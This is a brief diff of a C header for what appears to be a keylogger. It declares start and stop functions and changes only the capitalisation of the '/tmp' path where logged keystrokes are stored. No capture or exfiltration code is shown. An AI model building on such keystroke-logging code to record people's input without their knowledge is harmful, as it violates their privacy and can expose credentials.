@@ -12,6 +12,6 @@ void start_keylog(void);
 void stop_keylog(void);
 
 
-#define keyLogPath "/tmp/keyLog_file" 
+#define keyLogPath "/tmp/keylog_file"
 
 #endif /* KEYLOG_H */
